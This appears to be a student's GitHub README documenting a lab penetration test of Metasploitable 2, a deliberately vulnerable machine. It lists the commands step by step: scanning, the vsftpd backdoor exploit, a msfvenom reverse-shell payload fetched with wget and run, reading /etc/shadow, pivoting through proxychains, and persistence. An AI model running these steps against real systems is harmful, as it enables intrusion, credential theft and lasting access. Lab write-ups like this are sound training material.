
# 🔐 End-to-End VAPT Workflow using Metasploitable 2

## 📌 Project Overview
This project demonstrates a *complete Vulnerability Assessment and Penetration Testing (VAPT) workflow* performed on *Metasploitable 2* in a controlled lab environment.

The objective is to simulate real-world cyber attacks and understand how vulnerabilities can be exploited, escalated, and maintained.

---

## 🎯 Objectives
- Perform network reconnaissance using Nmap
- Identify open ports and vulnerable services
- Exploit vulnerabilities using Metasploit
- Gain unauthorized access
- Perform privilege escalation
- Establish persistence
- Perform pivoting and internal network scanning

---

## 🛠️ Tools Used
- Kali Linux
- Metasploitable 2
- Nmap
- Metasploit Framework
- Dirb / Gobuster
- Proxychains

---

## 🧠 Methodology (Step-by-Step)

### 1️⃣ Target Identification
- Identified attacker and target machine IP using:
```bash
ifconfig

📸 Screenshot: Target IP Identification

⸻

2️⃣ Network Scanning
	•	Performed port scanning using Nmap:

nmap -sV <target-ip>

📸 Screenshot: Open Ports & Services

⸻

3️⃣ Service Enumeration
	•	Enumerated services and versions
📸 Screenshot: Service Detection Output

⸻

4️⃣ Directory Enumeration
	•	Discovered hidden directories using:

dirb http://<target-ip>

📸 Screenshot: Directory Enumeration Results

⸻

5️⃣ Vulnerability Identification
	•	Searched for exploits using:

searchsploit vsftpd

📸 Screenshot: Exploit Search Results

⸻

6️⃣ Initial Exploitation
	•	Exploited VSFTPD backdoor:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
run

📸 Screenshot: Exploitation Success

⸻

7️⃣ Shell Access Verification

whoami
uname -a


⸻

8️⃣ Privilege Verification

id
cat /etc/shadow


⸻

9️⃣ Meterpreter Payload Deployment

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=6666 -f elf > shell.elf

Start listener:

use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run

Transfer payload:

wget http://<attacker-ip>:8000/shell.elf
chmod +x shell.elf
./shell.elf

📸 Screenshot: Payload Execution

⸻

🔟 Meterpreter Session

sessions
sessions -i 1
sysinfo
getuid

📸 Screenshot: Meterpreter Access

⸻

1️⃣1️⃣ Pivoting (Autoroute)

run autoroute -s 192.168.98.0/24

📸 Screenshot: Pivoting Setup

⸻

1️⃣2️⃣ SOCKS Proxy Setup

use auxiliary/server/socks_proxy
set SRVPORT 1080
run


⸻

1️⃣3️⃣ Proxychains Configuration

strict_chain
proxy_dns
socks4 127.0.0.1 1080

📸 Screenshot: Proxychains Config

⸻

1️⃣4️⃣ Internal Network Scanning

proxychains nmap -sT 192.168.98.0/24

📸 Screenshot: Internal Scan

⸻

1️⃣5️⃣ Credential Harvesting

cat /etc/passwd
cat /etc/shadow

📸 Screenshot: Credential Dump

⸻

1️⃣6️⃣ Persistence

upload shell.elf /tmp/
chmod +x /tmp/shell.elf
./shell.elf


⸻

1️⃣7️⃣ SSH Key Persistence

ssh-keygen

📸 Screenshot: SSH Key Persistence

⸻

📊 Results
	•	Successfully exploited vulnerable service (VSFTPD)
	•	Achieved root-level access
	•	Established Meterpreter session
	•	Performed pivoting into internal network
	•	Extracted credentials
	•	Maintained persistent access

⸻

📸 Screenshots

All screenshots are included in the /screenshots folder:

Step	Description
Target Identification	IP detection
Nmap Scan	Open ports
Enumeration	Service details
Exploitation	Shell access
Meterpreter	Advanced control
Pivoting	Internal routing
Proxychains	Internal scan
Credential Dump	Sensitive data
Persistence	Backdoor setup


⸻


🔐 Key Learnings
	•	Importance of reconnaissance phase
	•	Real-world exploitation workflow
	•	Post-exploitation techniques
	•	Pivoting and lateral movement
	•	Persistence mechanisms

⸻

⚠️ Disclaimer

This project was conducted in a controlled lab environment for educational purposes only. Unauthorized testing on real systems is illegal.

⸻

👨‍💻 Author

Lokeshwar V
Cybersecurity Enthusiast | SOC Analyst Aspirant

🔗 LinkedIn: https://www.linkedin.com/in/lokeshwar-v-011b20289
🔗 GitHub: https://github.com/Loke31033

⸻

⭐ If you found this useful, give it a star!

---
